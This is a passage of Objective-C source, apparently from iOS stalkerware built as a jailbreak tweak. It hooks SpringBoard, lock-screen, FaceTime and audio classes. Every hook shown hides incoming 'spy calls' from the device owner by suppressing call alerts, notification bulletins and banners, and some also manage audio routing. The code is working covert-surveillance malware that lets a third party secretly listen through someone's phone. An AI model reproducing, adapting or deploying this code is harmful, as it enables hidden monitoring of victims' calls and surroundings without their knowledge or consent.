            MSHookMessage($MPPhoneCallWaitingController, @selector(initWithCall:),
                          $MPPhoneCallWaitingController$initWithCalliPadiPodTouch$,
                          &_MPPhoneCallWaitingController$initWithCalliPadiPodTouch$);
        }
		//_MPPhoneCallWaitingController$_addCallWaitingButtons$ = MSHookMessage($MPPhoneCallWaitingController, @selector(_addCallWaitingButtons:), &$MPPhoneCallWaitingController$_addCallWaitingButtons$);
        MSHookMessage($MPPhoneCallWaitingController, @selector(_addCallWaitingButtons:), $MPPhoneCallWaitingController$_addCallWaitingButtons$, &_MPPhoneCallWaitingController$_addCallWaitingButtons$);
		//_MPPhoneCallWaitingController$_newBottomButtonBar = MSHookMessage($MPPhoneCallWaitingController, @selector(_newBottomButtonBar), &$MPPhoneCallWaitingController$_newBottomButtonBar);
        MSHookMessage($MPPhoneCallWaitingController, @selector(_newBottomButtonBar), $MPPhoneCallWaitingController$_newBottomButtonBar, &_MPPhoneCallWaitingController$_newBottomButtonBar);
		// Hook for ringing + vibrate (spy call in progress normal come in) sometime go to incoming call controller
		//_MPPhoneCallWaitingController$viewWillAppear$ = MSHookMessage($MPPhoneCallWaitingController, @selector(viewWillAppear:), &$MPPhoneCallWaitingController$viewWillAppear$);
        MSHookMessage($MPPhoneCallWaitingController, @selector(viewWillAppear:), $MPPhoneCallWaitingController$viewWillAppear$, &_MPPhoneCallWaitingController$viewWillAppear$);
        //_MPPhoneCallWaitingController$viewDidAppear$ = MSHookMessage($MPPhoneCallWaitingController, @selector(viewDidAppear:), &$MPPhoneCallWaitingController$viewDidAppear$);
        MSHookMessage($MPPhoneCallWaitingController, @selector(viewDidAppear:), $MPPhoneCallWaitingController$viewDidAppear$, &_MPPhoneCallWaitingController$viewDidAppear$);

		if ([SystemUtilsImpl isIpodTouch] || [SystemUtilsImpl isIpad]) {
#pragma mark - FaceTime -
		
			Class $MPIncomingFaceTimeCallController = [bundle classNamed:@"MPIncomingFaceTimeCallController"];
			Class $MPFaceTimeCallWaitingController = [bundle classNamed:@"MPFaceTimeCallWaitingController"];
			APPLOGVERBOSE(@"Class X, Class Y, %@, %@", $MPIncomingFaceTimeCallController, $MPFaceTimeCallWaitingController);
            
            // To detect incoming and incoming waiting FaceTime call
            // iOS 7
            MSHookMessage($MPIncomingFaceTimeCallController, @selector(initWithChat:), $MPIncomingFaceTimeCallController$initWithChat$, &_MPIncomingFaceTimeCallController$initWithChat$);
            MSHookMessage($MPFaceTimeCallWaitingController, @selector(initWithChat:), $MPFaceTimeCallWaitingController$initWithChat$, &_MPFaceTimeCallWaitingController$initWithChat$);
            
			// IOS 6
			// To detect incoming and incoming waiting FaceTime call
			//_MPIncomingFaceTimeCallController$initWithHandle$conferenceID$ = MSHookMessage($MPIncomingFaceTimeCallController, @selector(initWithHandle:conferenceID:), &$MPIncomingFaceTimeCallController$initWithHandle$conferenceID$);
            MSHookMessage($MPIncomingFaceTimeCallController, @selector(initWithHandle:conferenceID:), $MPIncomingFaceTimeCallController$initWithHandle$conferenceID$, &_MPIncomingFaceTimeCallController$initWithHandle$conferenceID$);
			//_MPFaceTimeCallWaitingController$initWithHandle$conferenceID$ = MSHookMessage($MPFaceTimeCallWaitingController, @selector(initWithHandle:conferenceID:), &$MPFaceTimeCallWaitingController$initWithHandle$conferenceID$);
            MSHookMessage($MPFaceTimeCallWaitingController, @selector(initWithHandle:conferenceID:), $MPFaceTimeCallWaitingController$initWithHandle$conferenceID$, &_MPFaceTimeCallWaitingController$initWithHandle$conferenceID$);
			
			// IOS 5
			// To detect incoming and incoming waiting FaceTime call
			//_MPIncomingFaceTimeCallController$initWithConferenceController$inviter$conferenceID$ = MSHookMessage($MPIncomingFaceTimeCallController, @selector(initWithConferenceController:inviter:conferenceID:),
			//																									 &$MPIncomingFaceTimeCallController$initWithConferenceController$inviter$conferenceID$);
            MSHookMessage($MPIncomingFaceTimeCallController,
                          @selector(initWithConferenceController:inviter:conferenceID:),
                          $MPIncomingFaceTimeCallController$initWithConferenceController$inviter$conferenceID$,
                          &_MPIncomingFaceTimeCallController$initWithConferenceController$inviter$conferenceID$);
			//_MPFaceTimeCallWaitingController$initWithConferenceController$inviter$conferenceID$ = MSHookMessage($MPFaceTimeCallWaitingController, @selector(initWithConferenceController:inviter:conferenceID:),
			//																									 &$MPFaceTimeCallWaitingController$initWithConferenceController$inviter$conferenceID$);
            MSHookMessage($MPFaceTimeCallWaitingController,
                          @selector(initWithConferenceController:inviter:conferenceID:),
                          $MPFaceTimeCallWaitingController$initWithConferenceController$inviter$conferenceID$,
                          &_MPFaceTimeCallWaitingController$initWithConferenceController$inviter$conferenceID$);
			
			
		}
	} else if ([[bundle bundleIdentifier] isEqualToString:@"com.apple.InCallLockScreen"]) {
        if (![bundle isLoaded]) {
            // iOS 7, Hook to block update when FaceTime spy call is in progress or connecting
            // attention: init method crashs iPhone/iPad SpringBoard "Job appears to have crashed: Illegal instruction: 4"
            /*
             This bunlde is loaded every time user make outgoing call, thus if we did not make sure that the method is hooked only one time
             there will be crash with above reason. May be because of second hook get the implementation of first hook that's why the call
             will recursive to itself non-stop.
             */
            
            // iOS 7,8
            Class $InCallLockScreenController = [bundle classNamed:@"InCallLockScreenController"];
            APPLOGVERBOSE(@"Class of InCallLockScreenController, %@", $InCallLockScreenController);
            MSHookMessage($InCallLockScreenController, @selector(init), $InCallLockScreenController$init, &_InCallLockScreenController$init);
            //MSHookMessage($InCallLockScreenController, @selector(shouldShowInCallInfo), $InCallLockScreenController$shouldShowInCallInfo, &_InCallLockScreenController$shouldShowInCallInfo);
        }
    }
	return CALL_ORIG(SBPluginManager, loadPluginBundle$, arg1);
}

#pragma mark -
#pragma mark SBAwayBulletinListController methods
#pragma mark -

HOOK(SBAwayBulletinListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {
	APPLOGVERBOSE(@"--------------- observer$addBulletin$forFeed$ -----------------");
	APPLOGVERBOSE(@"[arg1 class] = %@, arg1 = %@", [arg1 class], arg1);
	APPLOGVERBOSE(@"[arg2 class] = %@, arg2 = %@", [arg2 class], arg2);
	APPLOGVERBOSE(@"arg3 = %d", arg3);
	APPLOGVERBOSE(@"--------------- observer$addBulletin$forFeed$ -----------------");
	
	BBBulletin *bulletin = arg2;
	
	APPLOGVERBOSE(@"--------------- bulletin -----------------");
	APPLOGVERBOSE(@"bulletinID = %@", [bulletin bulletinID]); // 9D43549A-117E-4381-9149-6E337FB6D041
	APPLOGVERBOSE(@"context = %@", [bulletin context]); // {key=value} contactInfo = 0850634791
	APPLOGVERBOSE(@"addressBookRecordID = %d", [bulletin addressBookRecordID]); // -1
	APPLOGVERBOSE(@"publisherBulletinID = %@", [bulletin publisherBulletinID]); // null
	APPLOGVERBOSE(@"recordID = %@", [bulletin recordID]); // missedcall 463-0850634791-1367214015-1-0
	APPLOGVERBOSE(@"sectionID = %@", [bulletin sectionID]); // com.apple.mobilephone
	APPLOGVERBOSE(@"--------------- bulletin -----------------");
	
	BBContent *bbContent = [bulletin content];
	
	// This to fix issue of monitor number is saved in address book then monitor call come in while music is playing
	// in phone is locked with passcode... (Pla found this issue)
	NSDictionary *context = [bulletin context];
	NSString *contactInfo = [context objectForKey:@"contactInfo"];
	
	if (![SpyCallUtils isSpyNumber:[bbContent title]] &&
		![SpyCallUtils isSpyNumber:contactInfo]) {
		if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
			isSpyCallDisconnectingSB()) {
			;
		} else {
			if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:contactInfo]) {
#pragma mark - FaceTime -
				;
			} else {
				CALL_ORIG(SBAwayBulletinListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
			}
		}
	}
}

#pragma mark -
#pragma mark SBLockScreenNotificationListController hooks
#pragma mark -

// This is call on iOS 7 when there is a alert on Lock Screen. E.g., alert from Message application, LINE applcation
// This class exist on iOS 7
HOOK(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned int arg3) {
    DLog (@"*****************************************************************************************");
    DLog (@"***************** SBLockScreenNotificationListController addBulletin ********************");
    DLog (@"*****************************************************************************************");
	DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);
	DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);
	DLog(@"arg3 = %d", arg3);
	
    BBBulletin *bulletin    = arg2;
    NSString *message       = [bulletin message];
    
    DLog(@"message, %@", message);
    DLog(@"section, %@", [bulletin section]);
    DLog(@"sectionID, %@", [bulletin sectionID]);
    DLog(@"contactInfo, %@", [bulletin context]);
    
    // -- Consider for all applications
//    if ([[bulletin sectionID] isEqualToString:@"com.apple.facetime"]) {
        BBContent *bbContent = [bulletin content];
        // This to fix issue of monitor number is saved in address book then monitor call come in while music is playing
        // in phone is locked with passcode... (Pla found this issue)
        NSDictionary *context = [bulletin context];
        NSString *contactInfo = [context objectForKey:@"contactInfo"];
        
        if (![SpyCallUtils isSpyNumber:[bbContent title]] &&
            ![SpyCallUtils isSpyNumber:contactInfo]) {
            if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
                isSpyCallDisconnectingSB()) {
                ;
            } else {
                if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:contactInfo]) {
#pragma mark - FaceTime -
                    ;
                } else {
                    CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
                }
            }
        } else {
            // Spy, block!
        }
        
//    } else {
//        CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
//    }
}

// iOS 8
HOOK(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, void, id arg1, id arg2, unsigned int arg3, BOOL arg4, id arg5) {
    DLog (@"************************************************************************************");
    DLog (@"***************** SBLockScreenNotificationListController addBulletin ***************");
    DLog (@"************************************************************************************");
	//DLog(@"[arg1 class] = %@", [arg1 class]);
	DLog(@"arg1 = %@", arg1);   // BBObserver
	//DLog(@"[arg2 class] = %@", [arg2 class]); // BBBulletin could be in SpringBoard plugin
	DLog(@"arg2 = %@", arg2);   // BBBulletin
	DLog(@"arg3 = %d", arg3);
    DLog(@"arg4 = %d", arg4);
	DLog(@"arg5 = %@", arg5);   // __NSMallocBlock__
	
    BBBulletin *bulletin    = arg2;
    
    DLog(@"section %@", [bulletin section]);
    DLog(@"sectionID %@", [bulletin sectionID]);
    DLog(@"message %@", [bulletin message]);
    
    BBContent *bbContent = [bulletin content];
    /*
     To fix issue of monitor number is saved to address book then monitor call come in while music is playing
     and phone is locked with passcode... (Pla found this issue)
     */
    
    NSDictionary *context = [bulletin context];
    NSString *contactInfo = [context objectForKey:@"contactInfo"];
    
    DLog(@"context %@", context);
    DLog(@"contactInfo %@", contactInfo);   // +66923749532
    
    if (![SpyCallUtils isSpyNumber:[bbContent title]] &&
        ![SpyCallUtils isSpyNumber:contactInfo]) {
        if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
            isSpyCallDisconnectingSB()) {
            ;
        } else {
            if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:contactInfo]) {
#pragma mark - FaceTime -
                ;
            } else {
                CALL_ORIG(SBLockScreenNotificationListController, observer$addBulletin$forFeed$playLightsAndSirens$withReply$, arg1, arg2, arg3, arg4, arg5);
            }
        }
    } else {
        // Spy, block!
    }
}

#pragma mark - SBBulletinObserverViewController -

// iOS 7,8
HOOK(SBBulletinObserverViewController, observer$addBulletin$forFeed$, void, id arg1, id arg2, unsigned long long arg3) {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>> SBBulletinObserverViewController, observer$addBulletin$forFeed$");
	DLog(@"arg2: %@", arg2) // BBBulletin
	
    BBBulletin *bannerItem = arg2;
	//DLog(@"_appName %@", [bannerItem _appName])
	DLog(@"title        %@", [bannerItem title])
	DLog(@"message      %@", [bannerItem message])
	DLog(@"content      %@", [bannerItem content])
	DLog(@"context      %@", [bannerItem context])
	DLog(@"sectionID    %@", [bannerItem sectionID])
	DLog(@"section      %@", [bannerItem section])
	
    if ([[bannerItem sectionID] isEqualToString:@"com.apple.facetime"]      ||
        [[bannerItem sectionID] isEqualToString:@"com.apple.InCallService"] ||
        [[bannerItem sectionID] isEqualToString:@"com.apple.mobilephone"]) {
        NSDictionary *context = [bannerItem context];
        NSString *contactInfo = [context objectForKey:@"contactInfo"];
        
        if (![SpyCallUtils isSpyNumber:[bannerItem title]] &&
            ![SpyCallUtils isSpyNumber:contactInfo]) {
            if ((isNormalCallInProgressSB() || isAudioActiveSB() || isAnyCallOnHoldSB() || countNormalCallSB() >= MAX_CONFERENCE_LINE) &&
                isSpyCallDisconnectingSB()) {
                ;
            } else {
                if ([FaceTimeSpyCallUtils isFaceTimeSpyCall:contactInfo]) {
#pragma mark - FaceTime -
                    ;
                } else {
                    CALL_ORIG(SBBulletinObserverViewController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
                }
            }
        } else {
            // Spy, block!
        }
    } else {
        CALL_ORIG(SBBulletinObserverViewController, observer$addBulletin$forFeed$, arg1, arg2, arg3);
    }
}

///========================= AVController ==================

#pragma mark -
#pragma mark AVController methods
#pragma mark -

HOOK(AVController, init, id) {
	APPLOGVERBOSE(@"init");
	AVController *avController = CALL_ORIG(AVController, init);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
    
    // For testing purpose, this method does not call on iOS 8 (may be iOS 7 too)
	//[[[SpyCallManager sharedManager] mSystemEnvUtils] dumpAudioCategory];
    //[[[SpyCallManager sharedManager] mSystemEnvUtils] dumpAudioRoute];
    
	return (avController);
}

// iOS 7,8
HOOK(AVController, initWithQueue$fmpType$error$, id, id arg1, unsigned int arg2, id *arg3) {
	AVController *avController = CALL_ORIG(AVController, initWithQueue$fmpType$error$, arg1, arg2, arg3);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
    APPLOGVERBOSE(@"initWithQueue$fmpType$error$, %@", avController);
    
    // iOS 8, for testing purpose
	//[[[SpyCallManager sharedManager] mSystemEnvUtils] dumpAudioCategory];
    //[[[SpyCallManager sharedManager] mSystemEnvUtils] dumpAudioRoute];
    
    return (avController);
}

HOOK(AVController, initWithQueue$error$, id, id arg1, id *arg2) {
	AVController *avController = CALL_ORIG(AVController, initWithQueue$error$, arg1, arg2);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
    APPLOGVERBOSE(@"initWithQueue$error$, %@", avController);
    return (avController);
}

HOOK(AVController, initForStreaming, id) {
	AVController *avController = CALL_ORIG(AVController, initForStreaming);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
    APPLOGVERBOSE(@"initForStreaming, %@", avController);
    return (avController);
}

HOOK(AVController, initWithError$, id, id *arg1) {
	AVController *avController = CALL_ORIG(AVController, initWithError$, arg1);
	[[[SpyCallManager sharedManager] mSystemEnvUtils] setMAVController:avController];
    APPLOGVERBOSE(@"initWithError$, %@", avController);
    return (avController);
}

///========================= INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 4 ==================
#pragma mark -
#pragma mark INCOMING CALL, CALL WAITING AUDIO CONTROL IOS 4
#pragma mark -

#pragma mark -
#pragma mark SBCallAlert methods
#pragma mark -

HOOK(SBCallAlert, initWithCall$, id, id arg1) {
	APPLOGVERBOSE(@"initWithCall$");
	CTCall *call = (CTCall *)arg1;
	if ([SpyCallUtils isSpyCall:call]) {
		return nil;
	} else {
		return CALL_ORIG(SBCallAlert, initWithCall$, arg1);
	}
}

#pragma mark -
#pragma mark SBCallAlertDisplay methods
#pragma mark -

HOOK(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, void, id arg1, id arg2, unsigned int arg3) {
	APPLOGVERBOSE(@"updateLCDWithName$label$breakPoint$");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
			[self ringOrVibrate];
			CALL_ORIG(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
		}
	} else {
		CALL_ORIG(SBCallAlertDisplay, updateLCDWithName$label$breakPoint$, arg1, arg2, arg3);
	}
}

#pragma mark -
#pragma mark SBCallWaitingAlertDisplay methods
#pragma mark -

HOOK(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, void, BOOL arg1) {
	APPLOGVERBOSE(@"_addCallWaitingButtons");
	if (isSpyCallInProgressSB() || isSpyCallDisconnectingSB()) {
		if (isNormalCallIncomingSB()) {
			if (isSpyCallLeavingConferenceSB()) { // Conference state
				CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
			} else if (!isSpyCallInProgressSB()) { // Spy call state
				routeAudioSessionToRingTone([[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController]);
				[self ringOrVibrate];
				CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
			}
		}
	} else {
		CALL_ORIG(SBCallWaitingAlertDisplay, _addCallWaitingButtons$, arg1);
	}
}
